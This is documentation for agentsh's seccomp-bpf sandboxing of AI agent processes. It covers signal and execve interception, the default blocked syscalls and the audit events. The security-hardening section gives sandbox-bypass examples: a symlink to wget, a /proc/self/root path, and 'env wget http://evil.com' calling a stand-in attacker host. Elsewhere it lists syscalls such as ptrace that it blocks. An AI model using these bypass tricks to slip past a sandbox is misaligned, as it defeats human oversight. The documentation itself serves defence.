# Seccomp-BPF Syscall Filtering

agentsh uses seccomp-bpf to enforce syscall-level security controls on agent processes.

## Overview

When enabled, seccomp filtering provides three types of protection:

1. **Unix Socket Monitoring**: Intercepts socket operations for policy-based access control
2. **Signal Interception**: Intercepts signal delivery for policy-based allow/deny/redirect
3. **Syscall Blocking**: Immediately terminates processes that attempt blocked syscalls

## Configuration

```yaml
sandbox:
  seccomp:
    enabled: true
    mode: enforce  # enforce | audit | disabled

    unix_socket:
      enabled: true
      action: enforce  # enforce | audit

    signal_filter:
      enabled: true
      action: enforce  # enforce | audit

    syscalls:
      default_action: allow  # allow | block
      block:
        - ptrace
        - process_vm_readv
        - process_vm_writev
        - mount
        - umount2
        # ... see defaults below
      on_block: kill  # kill | log_and_kill
```

## Signal Interception

Signal filtering uses `SECCOMP_RET_USER_NOTIF` to intercept signal-related syscalls before they execute. This allows agentsh to evaluate policy rules and decide whether to allow, deny, redirect, or audit the signal.

### Intercepted Syscalls

| Syscall | Purpose |
|---------|---------|
| `kill` | Send signal to process by PID |
| `tkill` | Send signal to thread by TID |
| `tgkill` | Send signal to thread in specific process |
| `rt_sigqueueinfo` | Queue signal with additional data |
| `pidfd_send_signal` | Send signal via process file descriptor |

### How It Works

1. Process calls `kill(pid, SIGTERM)` or similar
2. seccomp traps the syscall and notifies agentsh via the user-notify fd
3. agentsh classifies the target (self, child, external, system, etc.)
4. Policy rules are evaluated for the signal/target combination
5. Decision is executed:
   - **allow**: Syscall continues normally
   - **deny**: Returns EPERM to caller
   - **redirect**: Signal number is modified (e.g., SIGKILL → SIGTERM)
   - **audit**: Syscall allowed, event logged

### Policy Configuration

Signal rules are defined in the policy file:

```yaml
signal_rules:
  # Allow signals to self and children
  - name: allow-self
    signals: ["@all"]
    target:
      type: self
    decision: allow

  - name: allow-children
    signals: ["@all"]
    target:
      type: children
    decision: allow

  # Block fatal signals to external processes
  - name: deny-external-fatal
    signals: ["@fatal"]
    target:
      type: external
    decision: deny

  # Redirect SIGKILL to SIGTERM for graceful shutdown
  - name: graceful-kill
    signals: ["SIGKILL"]
    target:
      type: descendants
    decision: redirect
    redirect_to: SIGTERM
```

### Signal Groups

| Group | Signals |
|-------|---------|
| `@all` | All signals (1-31) |
| `@fatal` | SIGKILL, SIGTERM, SIGQUIT, SIGABRT |
| `@job` | SIGSTOP, SIGCONT, SIGTSTP, SIGTTIN, SIGTTOU |
| `@reload` | SIGHUP, SIGUSR1, SIGUSR2 |

### Signal Events

```json
{
  "type": "signal_blocked",
  "timestamp": "2026-01-11T10:30:00Z",
  "session_id": "sess_abc123",
  "sender_pid": 12345,
  "target_pid": 1,
  "signal": "SIGKILL",
  "signal_number": 9,
  "target_type": "system",
  "decision": "deny",
  "policy_rule": "deny-system-signals"
}
```

See [Policy Documentation](operations/policies.md#signal-rules) for full configuration options.

## Execve Interception

Execve interception uses `SECCOMP_RET_USER_NOTIF` to trap `execve` and `execveat` syscalls, allowing agentsh to evaluate command execution against policy before it happens.

### Security Hardening

#### Path Canonicalization

Before policy evaluation, agentsh resolves the executable path using `filepath.EvalSymlinks`. This defeats bypass attacks using:
- Symlinks to blocked binaries (e.g., `ln -s /usr/bin/wget /tmp/safe && /tmp/safe`)
- `/proc/self/root` paths (e.g., `/proc/self/root/usr/bin/wget`)
- Relative path tricks

The original (pre-canonicalization) path is preserved in audit events as `raw_filename` for forensic analysis.

#### Transparent Command Unwrapping

When a wrapper command (like `env`, `sudo`, or `ld-linux`) is detected, agentsh "unwraps" it to find the real payload command and evaluates both against policy. The most restrictive decision wins.

**Example:** `env wget http://evil.com`
1. `env` is recognized as transparent → unwrap
2. Payload `wget` found after skipping flags/assignments
3. Both `env` and `wget` evaluated: if `wget` is denied, the whole execution is denied

See [Policy Documentation](operations/policies.md#transparent-commands) for configuration.

### Execve Events

```json
{
  "type": "execve",
  "timestamp": "2026-03-04T10:30:00Z",
  "session_id": "sess_abc123",
  "pid": 12345,
  "parent_pid": 12300,
  "depth": 1,
  "filename": "/usr/bin/wget",
  "raw_filename": "/proc/self/root/usr/bin/wget",
  "argv": ["wget", "https://example.com"],
  "unwrapped_from": "/usr/bin/env",
  "payload_command": "wget",
  "effective_action": "blocked",
  "policy": {
    "decision": "deny",
    "effective_decision": "deny",
    "rule": "block-wget"
  }
}
```

## Default Blocked Syscalls

When seccomp is enabled, these syscalls are blocked by default:

| Syscall | Reason |
|---------|--------|
| ptrace | Process debugging/injection |
| process_vm_readv | Cross-process memory read |
| process_vm_writev | Cross-process memory write |
| personality | Execution domain changes |
| mount | Filesystem mounting |
| umount2 | Filesystem unmounting |
| pivot_root | Root filesystem changes |
| reboot | System reboot |
| kexec_load | Kernel replacement |
| init_module | Kernel module loading |
| finit_module | Kernel module loading (fd) |
| delete_module | Kernel module unloading |

## Audit Events

When a process is killed for attempting a blocked syscall, a `seccomp_blocked` event is logged:

```json
{
  "type": "seccomp_blocked",
  "timestamp": "2026-01-04T10:30:00Z",
  "session_id": "sess_abc123",
  "pid": 12345,
  "comm": "malicious-tool",
  "syscall": "ptrace",
  "syscall_nr": 101,
  "reason": "blocked_by_policy",
  "action": "killed"
}
```

## Requirements

- Linux kernel 5.0+ with seccomp user-notify support
- libseccomp installed (for syscall name resolution)
- CAP_SYS_ADMIN or no_new_privs for filter installation

**Tip:** Use `agentsh detect` to check if seccomp is available in your environment. See [Cross-Platform Notes](cross-platform.md#detecting-available-capabilities).
